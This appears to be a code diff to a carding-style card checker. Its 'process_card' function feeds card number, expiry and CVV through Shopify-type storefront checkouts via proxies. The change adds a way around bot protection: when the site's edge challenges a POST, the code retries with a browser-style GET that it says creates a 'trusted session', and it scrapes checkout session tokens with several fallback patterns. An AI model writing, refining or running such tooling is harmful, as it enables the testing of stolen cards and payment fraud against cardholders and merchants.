@@ -338,26 +338,43 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1'
             }
-            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
-            checkout_url = str(response.url)
+            # checkout creation: POST first; if the edge challenges it (instant fail, no
+            # session token), fall back to the browser-style GET that follows the shop.app
+            # universal redirect — that path creates a trusted session
+            sst = None
+            text = ""
+            checkout_url = ""
+            attempt_token = ""
+            for create_method in ("POST", "GET"):
+                try:
+                    if create_method == "POST":
+                        response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
+                    else:
+                        await asyncio.sleep(1.5)
+                        response = await session.get(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
+                except Exception:
+                    continue
+                checkout_url = str(response.url)
 
-            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
-            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
+                attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+                attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
 
-            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
-            
-            text = await response.text()
-            if not sst:
-                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
+                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
+
+                text = await response.text()
                 if not sst:
-                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
-                if not sst:
-                    sst = extract_between(text, '"serializedSessionToken":"', '"')
-                if not sst:
-                    sst = extract_between(text, 'data-session-token="', '"')
-                if not sst:
-                    sst = extract_between(text, '"sessionToken":"', '"')
-            
+                    sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
+                    if not sst:
+                        sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
+                    if not sst:
+                        sst = extract_between(text, '"serializedSessionToken":"', '"')
+                    if not sst:
+                        sst = extract_between(text, 'data-session-token="', '"')
+                    if not sst:
+                        sst = extract_between(text, '"sessionToken":"', '"')
+                if sst:
+                    break
+
             if 'login' in checkout_url.lower():
                 return False, "Site requires login!", gateway, total_price, currency
 
